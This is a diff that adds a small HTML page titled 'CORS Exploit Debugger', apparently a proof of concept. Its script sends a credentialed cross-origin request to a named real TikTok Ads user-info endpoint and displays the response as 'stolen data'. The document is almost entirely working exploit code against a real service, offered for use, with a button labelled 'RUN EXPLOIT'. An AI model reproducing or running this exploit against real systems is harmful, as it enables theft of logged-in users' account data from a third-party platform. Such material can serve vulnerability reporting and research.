@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit - Debug Mode</title>
+    <script>
+        function exploit() {
+            const targetUrl = "https://ads.tiktok.com/CreativeOne/Client/ClientGetUserInfo?needPlain=true";
+            const exploitOrigin = window.location.origin; // Auto-match exploit domain
+            
+            console.log("[+] Starting exploit from origin:", exploitOrigin);
+            
+            var xhr = new XMLHttpRequest();
+            xhr.withCredentials = true; // Send cookies
+            
+            xhr.onreadystatechange = function() {
+                console.log(`[DEBUG] State: ${xhr.readyState}, Status: ${xhr.status}`);
+                
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        alert("SUCCESS! Stolen data:\n" + xhr.responseText);
+                        console.log("[+] Data stolen:", xhr.responseText);
+                    } else {
+                        alert(`ERROR ${xhr.status}: ${xhr.statusText || "Check console"}`);
+                        console.error("Request failed:", xhr);
+                    }
+                }
+            };
+            
+            xhr.open("GET", targetUrl, true);
+            
+            // Force-set Origin header (optional, some servers check this)
+            xhr.setRequestHeader("Origin", exploitOrigin);
+            
+            console.log("[+] Sending request to:", targetUrl);
+            xhr.send();
+        }
+    </script>
+</head>
+<body>
+    <h1>CORS Exploit Debugger</h1>
+    <button onclick="exploit()">RUN EXPLOIT</button>
+    <p>Check browser console (F12) for details.</p>
+</body>
+</html>
